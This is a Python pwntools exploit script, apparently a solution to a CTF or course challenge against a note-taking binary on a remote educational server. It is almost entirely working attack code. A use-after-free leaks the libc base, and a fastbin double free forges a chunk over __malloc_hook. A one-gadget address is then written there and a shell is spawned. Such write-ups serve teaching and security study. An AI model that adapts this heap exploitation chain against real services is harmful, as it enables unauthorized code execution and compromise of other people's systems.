import binascii
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc_path = os.path.join(os.getcwd(), './libc-2.23.so')
libc = ELF(libc_path)

p = remote('edu-ctf.csie.org', 10178)
# p = process('./note', env={'LD_PRELOAD': libc_path})
# gdb.attach(p, 'b main\n')

def add(size, body):
    p.sendlineafter('>', '1')
    p.sendlineafter('Size', str(size))
    p.sendafter('Note', body)

def show(idx):
    p.sendlineafter('>', '2')
    p.sendlineafter('Index', str(idx))

def delete(idx):
    p.sendlineafter('>', '3')
    p.sendlineafter('Index', str(idx))


# for throwing to unsorted bin
add(0x100, b'leak')
# seperate from top chunk lest the previous chunk being merged when freed
# 0x68 is for fake chunk's size 0x70, which is utilized later
add(0x68, 'aaa') # idx=1
add(0x68, 'aaa') # idx=2
# now we can safely delete it
delete(0)
# showing it will result in information leak
show(0)

p.recvline()
# mysterious offs found via gdb
libc_base = u64(p.recv(6) + b'\0\0') - 0x3c4b78
log.success('libc base: %s', hex(libc_base))


delete(1)
delete(2)
delete(1)

# get 1st chunk, fake it
add(0x68, p64(libc_base + libc.symbols[b'__malloc_hook'] - 0x10 - 3))
# get 2nd, 1st
add(0x68, 'x')
add(0x68, 'x')

# get fake chunk, which points to malloc_hook-3. put one gadget here
add(0x68, b'aaa' + p64(libc_base + 0xf02a4))

# trigger double free to lead libc calling malloc; spawn shell
delete(0)

p.interactive()
